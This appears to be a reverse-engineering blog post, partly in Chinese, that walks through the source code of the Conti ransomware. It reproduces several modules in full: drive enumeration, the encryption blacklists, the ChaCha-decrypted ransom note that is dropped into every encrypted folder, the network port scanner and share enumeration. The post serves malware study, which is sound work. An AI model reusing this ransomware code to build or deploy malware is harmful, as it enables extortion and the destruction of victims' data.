<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32W</span><br><span class="line">&#123;</span><br><span class="line">    DWORD   dwSize;</span><br><span class="line">    DWORD   cntUsage;</span><br><span class="line">    DWORD   th32ProcessID;          // this process</span><br><span class="line">    ULONG_PTR th32DefaultHeapID;</span><br><span class="line">    DWORD   th32ModuleID;           // associated exe</span><br><span class="line">    DWORD   cntThreads;</span><br><span class="line">    DWORD   th32ParentProcessID;    // this process&#x27;s parent process</span><br><span class="line">    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads</span><br><span class="line">    DWORD   dwFlags;</span><br><span class="line">    WCHAR   szExeFile[MAX_PATH];    // Path</span><br><span class="line">&#125; PROCESSENTRY32W;</span><br></pre></td></tr></table></figure>

<p>szExeFile为进程运行文件路径</p>
</blockquote>
<h3 id="Whitelist"><a href="#Whitelist" class="headerlink" title="Whitelist"></a>Whitelist</h3><p>把进程名不为explorer.exe的进程全都插入到白名单进程列表中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	TAILQ_INSERT_TAIL(head, elm, field) do &#123;			\</span></span><br><span class="line"><span class="meta">	TAILQ_NEXT((elm), field) = NULL;				\</span></span><br><span class="line"><span class="meta">	(elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last;			\</span></span><br><span class="line"><span class="meta">	*(head)-&gt;tqh_last = (elm);					\</span></span><br><span class="line"><span class="meta">	(head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field);			\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h2 id="global"><a href="#global" class="headerlink" title="global"></a>global</h2><p>set some global parameters,maybe used to build different character sample(extension,mutex…..)</p>
<ul>
<li>Extention</li>
<li>DecryptionNote</li>
<li>EncryptMode<ul>
<li>ALL_ENCRYPT 10</li>
<li>LOCAL_ENCRYPT 11</li>
<li>NETWORK_ENCRYPT 12</li>
<li>BACKUPS_ENCRYPT 13</li>
<li>PATH_ENCRYPT 14</li>
</ul>
</li>
<li>IsProcKillerEnabled</li>
<li>EncryptPath</li>
<li>EncryptSize</li>
<li>MutexName</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC WCHAR g_Extention[<span class="number">7</span>] = <span class="string">L&quot;.EXTEN&quot;</span>;</span><br><span class="line">STATIC CHAR g_DecryptNote[<span class="number">2048</span>] = <span class="string">&quot;__DECRYPT_NOTE__&quot;</span>;</span><br><span class="line">STATIC INT g_EncryptMode = ALL_ENCRYPT;</span><br><span class="line">STATIC BOOL g_IsProcKillerEnabled = FALSE;</span><br><span class="line">STATIC LPCWSTR g_EncryptPath = <span class="literal">NULL</span>;</span><br><span class="line">STATIC BYTE g_EncryptSize = <span class="number">50</span>;</span><br><span class="line"><span class="comment">//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;</span></span><br><span class="line"></span><br><span class="line">PWCHAR </span><br><span class="line"><span class="title function_">global::GetExtention</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_Extention;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR </span><br><span class="line"><span class="title function_">global::GetDecryptNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_DecryptNote;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR</span><br><span class="line"><span class="title function_">global::GetMutexName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//return g_MutexName;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetEncryptMode</span><span class="params">(INT EncryptMode)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptMode = EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INT</span><br><span class="line"><span class="title function_">global::GetEncryptMode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetProcKiller</span><span class="params">(BOOL IsEnabled)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_IsProcKillerEnabled = IsEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::GetProcKiller</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_IsProcKillerEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">global::SetEncryptPath</span><span class="params">(__in LPCWSTR Path)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptPath = Path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPCWSTR</span><br><span class="line"><span class="title function_">global::GetEncryptPath</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::SetEncryptSize</span><span class="params">(__in INT Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Size != <span class="number">10</span> ||</span><br><span class="line">		Size != <span class="number">15</span> ||</span><br><span class="line">		Size != <span class="number">20</span> ||</span><br><span class="line">		Size != <span class="number">25</span> ||</span><br><span class="line">		Size != <span class="number">30</span> ||</span><br><span class="line">		Size != <span class="number">35</span> ||</span><br><span class="line">		Size != <span class="number">40</span> ||</span><br><span class="line">		Size != <span class="number">45</span> ||</span><br><span class="line">		Size != <span class="number">50</span> ||</span><br><span class="line">		Size != <span class="number">60</span> ||</span><br><span class="line">		Size != <span class="number">70</span> ||</span><br><span class="line">		Size != <span class="number">80</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EncryptSize = <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><ul>
<li>va_start</li>
<li>va_arg</li>
<li>va_end</li>
</ul>
<p>The <strong>RtlSecureZeroMemory</strong> routine fills a block of memory with zeros in a way that is guaranteed to be secure.</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote>
<p>init in function main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(<span class="string">L&quot;-log&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (LogFile) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Init(LogFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs::Init(LPCWSTR LogFile)</span><br><span class="line">&#123;</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CritSec);</span><br><span class="line">	g_LogHandle = pCreateFileW(</span><br><span class="line">		LogFile,</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_ALWAYS,</span><br><span class="line">		FILE_FLAG_WRITE_THROUGH,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pSetFilePointer(g_LogHandle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write some errors.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError());</span><br></pre></td></tr></table></figure>

<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><h3 id="disks"><a href="#disks" class="headerlink" title="disks"></a>disks</h3><ul>
<li>SIZE_T BufferLength &#x3D; (SIZE_T)pGetLogicalDriveStringsW(0, NULL); </li>
<li>pGetLogicalDriveStringsW(BufferLength, Buffer);</li>
</ul>
<blockquote>
<p>GetLogicalDriveStringsW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetLogicalDriveStringsW(</span><br><span class="line">[in]  DWORD  nBufferLength,</span><br><span class="line">[out] LPWSTR lpBuffer</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes.</p>
<p>If the buffer is not large enough, the return value is greater than <em>nBufferLength</em>. It is the size of the buffer required to hold the drive strings.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;filesystem.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../logs/logs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">INT </span><br><span class="line"><span class="title function_">filesystem::EnumirateDrives</span><span class="params">(__in PDRIVE_LIST DriveList)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Length = <span class="number">0</span>;</span><br><span class="line">	INT DrivesCount = <span class="number">0</span>;</span><br><span class="line">	DWORD DriveType = <span class="number">0</span>;</span><br><span class="line">	TAILQ_INIT(DriveList);</span><br><span class="line"></span><br><span class="line">	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!BufferLength) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + <span class="number">1</span>) * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="keyword">if</span> (!Buffer) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pGetLogicalDriveStringsW(BufferLength, Buffer);</span><br><span class="line">	</span><br><span class="line">	LPWSTR tempBuffer = Buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Length = (INT)plstrlenW(tempBuffer)) &#123;</span><br><span class="line"></span><br><span class="line">		PDRIVE_INFO DriveInfo = new DRIVE_INFO;</span><br><span class="line">		<span class="keyword">if</span> (!DriveInfo) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(Buffer);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		DriveInfo-&gt;RootPath = tempBuffer;</span><br><span class="line">		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);</span><br><span class="line"></span><br><span class="line">		DrivesCount++;</span><br><span class="line">		tempBuffer += Length + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs::Write(OBFW(<span class="string">L&quot;Found %d drives: &quot;</span>), DrivesCount);</span><br><span class="line"></span><br><span class="line">	PDRIVE_INFO DriveInfo = <span class="literal">NULL</span>;</span><br><span class="line">	TAILQ_FOREACH(DriveInfo, DriveList, Entries) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;%s&quot;</span>), DriveInfo-&gt;RootPath.c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(Buffer);</span><br><span class="line">	<span class="keyword">return</span> DrivesCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
<li><p>MakeSearchMask</p>
<ul>
<li>used to generate a search mask path</li>
</ul>
</li>
<li><p>MakePath</p>
<ul>
<li>used to generate the file path</li>
</ul>
</li>
<li><p>CheckDirectory</p>
<ul>
<li><p>check if the <code>directory</code> is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking.</p>
<ul>
<li>&#96;&#96;&#96;<br>      OBFW(L”tmp”),<br>          OBFW(L”winnt”),<br>          OBFW(L”temp”),<br>          OBFW(L”thumb”),<br>          OBFW(L”$Recycle.Bin”),<br>          OBFW(L”$RECYCLE.BIN”),<br>          OBFW(L”System Volume Information”),<br>          OBFW(L”Boot”),<br>          OBFW(L”Windows”),<br>          OBFW(L”Trend Micro”),<br>          OBFW(L”perflogs”)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- CheckFilename</span><br><span class="line"></span><br><span class="line">    - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking.</span><br><span class="line"></span><br><span class="line">        - ```</span><br><span class="line">            		OBFW(L&quot;.exe&quot;),</span><br><span class="line">                		OBFW(L&quot;.dll&quot;),</span><br><span class="line">                		OBFW(L&quot;.lnk&quot;),</span><br><span class="line">                		OBFW(L&quot;.sys&quot;),</span><br><span class="line">                		OBFW(L&quot;.msi&quot;),</span><br><span class="line">                		OBFW(L&quot;readme.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;CONTI_LOG.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;.bat&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>DropInstruction</p>
<ul>
<li>release the reame.txt to every directory that is encrypted by Ransomeware.</li>
<li>the DecryptionNotes is encrypted with chacha<ul>
<li>the first 16 bytes is the key</li>
<li>the 16-20 bytes is the iv</li>
<li>the follow is the encrypted data</li>
</ul>
</li>
</ul>
</li>
<li><p>SearchFiles</p>
</li>
</ul>
<h4 id="DropInstruction"><a href="#DropInstruction" class="headerlink" title="DropInstruction"></a>DropInstruction</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">DropInstruction(__in <span class="built_in">std</span>::<span class="built_in">wstring</span> Directory)</span><br><span class="line">&#123;</span><br><span class="line">	LPCWSTR str = OBFW(<span class="string">L&quot;readme.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">wstring</span> Filename = MakePath(Directory, str);</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = pCreateFileW(</span><br><span class="line">		Filename.c_str(),</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwDecryptNote = <span class="number">0</span>;</span><br><span class="line">	LPSTR DecryptNote = global::GetDecryptNote();</span><br><span class="line"></span><br><span class="line">	ECRYPT_ctx CryptCtx;</span><br><span class="line">	BYTE ChaChaKey[<span class="number">32</span>];</span><br><span class="line">	BYTE ChaChaIV[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaKey, DecryptNote, <span class="number">32</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaIV, DecryptNote + <span class="number">32</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwDecryptNote, DecryptNote + <span class="number">40</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);</span><br><span class="line">	<span class="keyword">if</span> (!DecryptNotePlainText) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;CryptCtx, <span class="keyword">sizeof</span>(CryptCtx));</span><br><span class="line">  ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV);</span><br><span class="line"></span><br><span class="line">	ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + <span class="number">44</span>, (PBYTE)DecryptNotePlainText, dwDecryptNote);</span><br><span class="line"></span><br><span class="line">	DWORD BytesWritten;</span><br><span class="line">	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	pCloseHandle(hFile);</span><br><span class="line">	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);</span><br><span class="line">	<span class="built_in">free</span>(DecryptNotePlainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="networkscanner"><a href="#networkscanner" class="headerlink" title="networkscanner"></a>networkscanner</h2><p>complex network scanner code.</p>
<ul>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EnumShares"><a href="#EnumShares" class="headerlink" title="EnumShares"></a>EnumShares</h3><ul>
<li><p>NetShareEnum</p>
<ul>
<li>Retrieves information about each shared resource on a server.</li>
</ul>
</li>
<li><p>sharepath</p>
<table>
<thead>
<tr>
<th align="left">Constant&#x2F;value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STYPE_DISKTREE0x00000000</td>
<td align="left">Disk drive</td>
</tr>
<tr>
<td align="left">STYPE_SPECIAL0x80000000</td>
<td align="left">Special share reserved for interprocess communication (IPC$) or remote administration of the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703">server</a> (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.</td>
</tr>
<tr>
<td align="left">STYPE_TEMPORARY0x40000000</td>
<td align="left">A temporary share that is not persisted for creation each time the file server initializes.</td>
</tr>
</tbody></table>
</li>
</ul>
